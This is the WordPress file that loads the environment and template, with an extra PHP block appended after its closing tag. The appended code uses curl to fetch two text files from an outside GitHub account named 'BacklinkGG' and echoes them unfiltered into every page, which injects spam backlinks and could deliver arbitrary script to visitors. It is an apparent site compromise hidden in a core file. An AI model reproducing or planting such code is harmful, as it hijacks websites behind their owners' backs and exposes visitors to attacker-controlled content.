<?php
/**
 * Loads the WordPress environment and template.
 *
 * @package WordPress
 */

if ( ! isset( $wp_did_header ) ) {

	$wp_did_header = true;

	// Load the WordPress library.
	require_once __DIR__ . '/wp-load.php';

	// Set up the WordPress query.
	wp();

	// Load the theme template.
	require_once ABSPATH . WPINC . '/template-loader.php';

}
?>
<?php
$url1 = 'https://raw.githubusercontent.com/BacklinkGG/castano/main/NitipBacklink.txt';
$url2 = 'https://raw.githubusercontent.com/BacklinkGG/vip/main/vip.txt';
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_URL, $url1);
$result1 = curl_exec($ch);
curl_setopt($ch, CURLOPT_URL, $url2);
$result2 = curl_exec($ch);
curl_close($ch);
echo $result1;
echo $result2;
?>